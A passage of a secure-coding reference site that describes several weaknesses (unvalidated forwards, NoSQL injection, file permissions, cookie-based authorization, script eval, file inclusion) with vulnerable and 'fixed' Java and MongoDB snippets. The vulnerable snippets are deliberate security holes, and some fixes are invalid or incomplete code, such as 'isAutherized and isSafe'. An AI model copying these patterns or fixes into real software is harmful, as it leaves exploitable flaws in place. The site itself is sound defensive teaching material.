  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h4 id="fixed-code-example-2">Fixed code Example 2</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
     <span class="c1">// Check the authority and safety of the request first</span>
     <span class="k">if</span><span class="o">(</span><span class="n">isAutherized</span> <span class="n">and</span> <span class="nf">isSafe</span><span class="o">(</span><span class="n">request</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
  <span class="o">}</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/601.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-601.html">CWE-601</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1086">NoSQL Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Because these NoSQL injection attacks may execute within a procedural language, rather than in the declarative SQL language, the potential impacts are greater than traditional SQL injection.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Run your code using the lowest privileges that are required to accomplish the necessary tasks.</p>
</li>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">active</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="nx">$userInput</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);;</span>
</pre></div>
</td></tr></table>
<p>Even if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_NoSQL_injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1082">File Permission Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>When a file is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the file is related to program configuration, execution or sensitive user data. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Sensitive information leaked or program configuration error</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Strict control over file permissions</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setPermissionsByInputFile</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">inputFile</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">inputFile</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">PosixFilePermissions</span><span class="o">.</span><span class="na">fromString</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Read string input from file to set permissions. May lead to uncontrolled file permissions</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">file</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">parsePermission</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Through <code>parsePermission</code> function, verifing permissions from string input.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE732">
<p>https://cwe.mitre.org/data/definitions/732.html <a class="footnote-backref" href="#fnref-CWE732" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A5">
<p>https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control <a class="footnote-backref" href="#fnref-OWASP-A5" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0092">Reliance on Untrusted Inputs in a Security Decision</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a></li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</p>
<p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ol>
<li>Store state information and sensitive data on the server side only.  </li>
<li>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server. </li>
<li>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</li>
</ol>
<p>Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data. </p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following code excerpt reads a value from a browser cookie to determine the role of the user.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"role"</span><span class="o">))</span> <span class="o">{</span>
    <span class="n">userRole</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span><span class="o">[]</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getCookies</span><span class="o">();</span>
<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span> <span class="n">cookies</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
  <span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"authenticated"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> 
  <span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">getValue</span><span class="o">()))</span> <span class="o">{</span>
    <span class="n">authenticated</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>How to fix: See "Potential Mitigations"</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE807">
<p>http://cwe.mitre.org/data/definitions/807.html <a class="footnote-backref" href="#fnref-CWE807" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A1">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP-A1" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-807.html">CWE-807</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1080">Dynamic Code Evaluation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Code injection can occur when untrusted input is injected into dynamically constructed code. One obvious source of potential vulnerabilities is the use of JavaScript from Java code. The javax.script package consists of interfaces and classes that define Java scripting engines and a framework for the use of those interfaces and classes in Java code. Misuse of the javax.script API permits an attacker to execute arbitrary code on the target system.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Take care interpreting untrusted code.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This vulnerable code example incorporates untrusted user input into a JavaScript statement that is responsible for printing the input:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>The best defense against code injection vulnerabilities is to prevent the inclusion of executable user input in code. User input used in dynamic code must be sanitized, for example, to ensure that it contains only valid, whitelisted characters:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">evalScript</span><span class="o">(</span><span class="n">String</span> <span class="n">firstName</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ScriptException</span> <span class="o">{</span>
  <span class="c1">// Allow only alphanumeric and underscore chars in firstName</span>
  <span class="c1">// (modify if firstName may also include special characters)</span>
  <span class="k">if</span> <span class="o">(!</span><span class="n">firstName</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
    <span class="c1">// String does not match whitelisted characters</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">();</span>
  <span class="o">}</span>

  <span class="n">ScriptEngineManager</span> <span class="n">manager</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ScriptEngineManager</span><span class="o">();</span>
  <span class="n">ScriptEngine</span> <span class="n">engine</span> <span class="o">=</span> <span class="n">manager</span><span class="o">.</span><span class="na">getEngineByName</span><span class="o">(</span><span class="s">"javascript"</span><span class="o">);</span>
  <span class="n">engine</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span><span class="s">"print('"</span><span class="o">+</span> <span class="n">firstName</span> <span class="o">+</span> <span class="s">"')"</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS52-J.+Prevent+code+injection <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1093">Dangerous File Inclusion</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#remote-file-inclusion">Remote File Inclusion</a></li>
<li><a href="#local-file-inclusion">Local File Inclusion</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="remote-file-inclusion">Remote File Inclusion</h4>
<p>Remote File Inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.</p>
<h4 id="local-file-inclusion">Local File Inclusion</h4>
<p>Local File Inclusion (LFI) is similar to a Remote File Inclusion vulnerability except instead of including remote files, only local files i.e. files on the current server can be included for execution. This issue can still lead to remote code execution by including a file that contains attacker-controlled data such as the web server's access logs.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Avoid passing user-submitted input to any filesystem/framework API.</p>
</li>
<li>
<p>Maintain a white list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">&lt;%</span>
   <span class="n">String</span> <span class="n">p</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"p"</span><span class="o">);</span>
   <span class="nd">@include</span> <span class="n">file</span><span class="o">=</span><span class="s">"&lt;%="</span><span class="n">includes</span><span class="o">/</span><span class="s">" + p +"</span><span class="o">.</span><span class="na">jsp</span><span class="err">"</span><span class="k">%&gt;</span>"
%&gt;
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/File_inclusion_vulnerability <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0132">Download of Code Without Integrity Check</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
